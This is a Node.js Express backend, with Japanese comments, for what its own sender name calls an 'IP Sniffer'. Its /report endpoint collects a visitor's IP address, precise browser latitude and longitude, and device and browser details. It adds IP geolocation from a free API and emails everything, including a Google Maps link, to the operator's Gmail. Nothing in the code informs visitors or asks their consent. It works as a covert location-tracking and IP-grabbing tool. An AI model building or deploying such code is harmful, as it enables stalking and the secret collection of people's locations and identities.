// 完全無課金構成バージョンのNode.jsバックエンド
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/report', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const ua = uaParser(req.headers['user-agent']);
  const { latitude, longitude } = req.body;
  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  // 無料APIを使ったIPジオ情報取得（精度は中程度）
  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    geo = await geoRes.json();
  } catch (err) {
    console.error('IPジオAPIエラー:', err);
  }

  // Gmail送信用のトランスポーター
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `IP Sniffer <${process.env.GMAIL_USER}>`,
    to: process.env.GMAIL_USER,
    subject: '📡 アクセス情報通知（無料構成）',
    text: `
📡 アクセス情報：
- IPアドレス: ${ip}
- 国: ${geo.country || '不明'}
- 地域: ${geo.regionName || '不明'}
- 市区町村: ${geo.city || '不明'}
- 緯度/経度: ${latitude || '不明'} / ${longitude || '不明'}
- Google Maps: ${locationLink}
- 端末: ${ua.device.type || 'PC'} / ${ua.os.name || '不明'} / ${ua.browser.name || '不明'}
- アクセス時間: ${new Date().toLocaleString()}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('✅ Gmail送信成功');
  } catch (error) {
    console.error('❌ Gmail送信失敗:', error);
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`📡 Server running on http://localhost:${PORT}`);
});
